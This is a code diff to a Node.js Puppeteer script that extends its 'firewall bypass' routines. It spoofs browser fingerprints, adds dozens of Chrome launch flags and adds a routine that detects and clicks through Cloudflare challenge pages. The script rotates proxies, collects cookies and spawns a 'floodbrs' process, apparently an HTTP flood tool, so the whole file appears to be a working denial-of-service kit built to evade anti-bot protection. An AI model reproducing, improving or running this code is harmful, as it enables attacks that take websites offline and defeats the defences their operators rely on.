@@ -16,15 +16,24 @@ const COLORS = {
     RESET: '\x1b[0m'
 };
 
-// ========== FIREWALL BYPASS TECHNIQUES ==========
+// ========== ENHANCED FIREWALL BYPASS TECHNIQUES ==========
 const bypassFirewall = async (page) => {
     await page.evaluateOnNewDocument(() => {
+        // Remove automation indicators
         Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
         Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
         Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
         
-        window.chrome = { runtime: {}, loadTimes: () => {}, csi: () => {}, app: {} };
+        // Mock Chrome runtime
+        window.chrome = { 
+            runtime: {}, 
+            loadTimes: () => {}, 
+            csi: () => {}, 
+            app: {},
+            webstore: {}
+        };
         
+        // Override permissions API
         const originalQuery = window.navigator.permissions.query;
         window.navigator.permissions.query = (parameters) => (
             parameters.name === 'notifications' ?
@@ -32,6 +41,7 @@ const bypassFirewall = async (page) => {
                 originalQuery(parameters)
         );
 
+        // Spoof audio context
         const originalGetChannelData = AudioBuffer.prototype.getChannelData;
         AudioBuffer.prototype.getChannelData = function() {
             const result = originalGetChannelData.apply(this, arguments);
@@ -41,12 +51,33 @@ const bypassFirewall = async (page) => {
             return result;
         };
 
+        // Spoof WebGL
         const getParameter = WebGLRenderingContext.prototype.getParameter;
         WebGLRenderingContext.prototype.getParameter = function(parameter) {
             if (parameter === 37445) return 'Intel Inc.';
             if (parameter === 37446) return 'Intel Iris OpenGL Engine';
             return getParameter.apply(this, arguments);
         };
+
+        // Bypass automation detection
+        Object.defineProperty(navigator, 'hardwareConcurrency', { value: 4 });
+        Object.defineProperty(navigator, 'deviceMemory', { value: 4 });
+        
+        // Remove headless detection patterns
+        Object.defineProperty(document, 'hidden', { value: false });
+        Object.defineProperty(document, 'visibilityState', { value: 'visible' });
+        
+        // Spoof timezone
+        Object.defineProperty(Intl, 'DateTimeFormat', {
+            value: class extends Intl.DateTimeFormat {
+                constructor(locales, options) {
+                    if (options && options.timeZone === 'UTC') {
+                        return super(locales, { ...options, timeZone: 'America/New_York' });
+                    }
+                    return super(locales, options);
+                }
+            }
+        });
     });
 };
 
@@ -71,9 +102,119 @@ const getFirewallBypassArgs = () => [
     '--disable-prompt-on-repost',
     '--disable-domain-reliability',
     '--disable-component-update',
-    '--disable-features=TranslateUI,BlinkGenPropertyTrees,site-per-process'
+    '--disable-features=TranslateUI,BlinkGenPropertyTrees,site-per-process',
+    '--aggressive-cache-discard',
+    '--max_old_space_size=4096',
+    '--disable-site-isolation-trials',
+    '--disable-2d-canvas-clip-aa',
+    '--disable-2d-canvas-image-chromium',
+    '--disable-3d-apis',
+    '--disable-accelerated-2d-canvas',
+    '--disable-accelerated-jpeg-decoding',
+    '--disable-accelerated-mjpeg-decode',
+    '--disable-app-list-dismiss-on-blur',
+    '--disable-accelerated-video-decode',
+    '--disable-browser-side-navigation',
+    '--disable-component-extensions-with-background-pages',
+    '--disable-databases',
+    '--disable-es3-apis',
+    '--disable-es3-gl-context',
+    '--disable-file-system',
+    '--disable-gpu-compositing',
+    '--disable-local-storage',
+    '--disable-logging',
+    '--disable-notifications',
+    '--disable-offer-store-unmasked-wallet-cards',
+    '--disable-offer-upload-credit-cards',
+    '--disable-pepper-3d',
+    '--disable-prompt-on-repost',
+    '--disable-reading-from-canvas',
+    '--disable-remote-fonts',
+    '--disable-speech-api',
+    '--disable-sync',
+    '--disable-threaded-animation',
+    '--disable-threaded-scrolling',
+    '--disable-web-gl',
+    '--disable-webgl',
+    '--disable-webgl2',
+    '--enable-aggressive-domstorage-flushing',
+    '--enable-unsafe-swiftshader',
+    '--hide-scrollbars',
+    '--ignore-gpu-blacklist',
+    '--metrics-recording-only',
+    '--mute-audio',
+    '--no-first-run',
+    '--no-sandbox',
+    '--no-zygote',
+    '--password-store=basic',
+    '--use-mock-keychain',
+    '--disable-dev-shm-usage'
 ];
-// ========== END FIREWALL BYPASS ==========
+
+// Enhanced challenge detection and solving
+const solveAdvancedChallenge = async (page, browserProxy) => {
+    try {
+        // Wait for potential challenge to load
+        await page.waitForTimeout(3000);
+        
+        const url = page.url();
+        const title = await page.title();
+        const content = await page.content();
+        
+        // Check for various challenge types
+        if (title.includes('Just a moment') || 
+            title.includes('Checking your browser') ||
+            content.includes('challenge-platform') ||
+            content.includes('cf-browser-verification') ||
+            url.includes('challenges.cloudflare.com')) {
+            
+            // Multiple solving strategies
+            await page.waitForTimeout(2000);
+            
+            // Strategy 1: Wait for auto-redirect
+            try {
+                await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 15000 });
+                return true;
+            } catch (e) {}
+            
+            // Strategy 2: Look for challenge iframe and interact
+            const challengeFrame = await page.$('iframe[src*="challenges"]');
+            if (challengeFrame) {
+                const frame = await challengeFrame.contentFrame();
+                if (frame) {
+                    // Click on any interactive element
+                    const button = await frame.$('input[type="submit"], button, .btn, #challenge-submit');
+                    if (button) {
+                        await button.click();
+                        await page.waitForTimeout(5000);
+                        return true;
+                    }
+                }
+            }
+            
+            // Strategy 3: Direct form interaction
+            const submitButton = await page.$('input[type="submit"], button, .btn, #challenge-submit');
+            if (submitButton) {
+                await submitButton.click();
+                await page.waitForTimeout(5000);
+                return true;
+            }
+            
+            // Strategy 4: Simulate more human behavior
+            await page.mouse.move(100, 100);
+            await page.waitForTimeout(1000);
+            await page.mouse.move(200, 200);
+            await page.waitForTimeout(1000);
+            await page.mouse.click(150, 150);
+            await page.waitForTimeout(3000);
+        }
+        
+        return true;
+    } catch (error) {
+        return false;
+    }
+};
+// ========== END ENHANCED FIREWALL BYPASS ==========
 
 // Command-line argument validation
 if (process.argv.length < 6) {
@@ -347,7 +488,7 @@ const spoofFingerprint = async (page) => {
     });
 };
 
-// Captcha detection and handling
+// Enhanced challenge detection and handling
 const detectChallenge = async (browser, page, browserProxy) => {
     try {
         const title = await page.title();
@@ -358,37 +499,15 @@ const detectChallenge = async (browser, page, browserProxy) => {
             throw new Error('Proxy blocked');
         }
 
-        if (content.includes('challenge-platform')) {
-            coloredLog(COLORS.WHITE, `[INFO] Starting bypass for proxy: ${maskProxy(browserProxy)}`);
-            await sleep(5);
-
-            const captchaContainer = await page.$('body > div.main-wrapper > div > div > div > div');
-            if (captchaContainer) {
-                await simulateHumanMouseMovement(page, captchaContainer, {
-                    minMoves: 8,
-                    maxMoves: 20,
-                    minDelay: 40,
-                    maxDelay: 150,
-                    finalDelay: 1000,
-                    jitterFactor: 0.2,
-                    overshootChance: 0.4,
-                    hesitationChance: 0.3
-                });
-                await captchaContainer.click();
-
-                await page.waitForFunction(
-                    () => !document.querySelector('body > div.main-wrapper > div > div > div > div'),
-                    { timeout: 45000 }
-                );
-
-                const newTitle = await page.title();
-                if (newTitle === 'Just a moment...') {
-                    throw new Error('Captcha bypass failed');
-                }
-            }
+        // Use enhanced challenge solver
+        const challengeSolved = await solveAdvancedChallenge(page, browserProxy);
+        
+        if (!challengeSolved) {
+            coloredLog(COLORS.RED, `[INFO] Challenge bypass failed for proxy: ${maskProxy(browserProxy)}`);
+            throw new Error('Challenge bypass failed');
         }
 
-        await sleep(10);
+        await sleep(5);
     } catch (error) {
         throw error;
     }
@@ -434,7 +553,7 @@ const launchBrowserWithRetry = async (targetURL, browserProxy, attempt = 1, maxR
             '--force-color-profile=srgb',
             '--enable-quic',
             '--enable-features=PostQuantumKyber',
-            // ========== TAMBAHKAN FIREWALL BYPASS ARGS ==========
+            // ========== ENHANCED FIREWALL BYPASS ARGS ==========
             ...getFirewallBypassArgs()
         ],
         defaultViewport: {
@@ -454,7 +573,7 @@ const launchBrowserWithRetry = async (targetURL, browserProxy, attempt = 1, maxR
         const client = page._client();
 
         await spoofFingerprint(page);
-        // ========== TAMBAHKAN FIREWALL BYPASS ==========
+        // ========== ENHANCED FIREWALL BYPASS ==========
         await bypassFirewall(page);
 
         page.on('framenavigated', (frame) => {
@@ -507,7 +626,7 @@ const launchBrowserWithRetry = async (targetURL, browserProxy, attempt = 1, maxR
     }
 };
 
-// Thread handling - ĐÃ SỬA: Spawn liên tục seperti browser1.js
+// Thread handling - ĐÃ SỬA: Spawn liên tục như browser1.js
 const startThread = async (targetURL, browserProxy, task, done, retries = 0) => {
     if (retries >= COOKIES_MAX_RETRIES) {
         done(null, { task, currentTask: queue.length() });
@@ -532,7 +651,7 @@ const startThread = async (targetURL, browserProxy, task, done, retries = 0) => 
             console.log(cookieInfo);
 
             try {
-                coloredLog(COLORS.YELLOW, `[DEBUG] Spawning floodbrs dengan proxy: ${maskProxy(browserProxy)}`);
+                coloredLog(COLORS.YELLOW, `[DEBUG] Spawning floodbrs với proxy: ${maskProxy(browserProxy)}`);
                 
                 // SPAWN LIÊN TỤC NHƯ BROWSER1.JS
                 const floodProcess = spawn('node', [
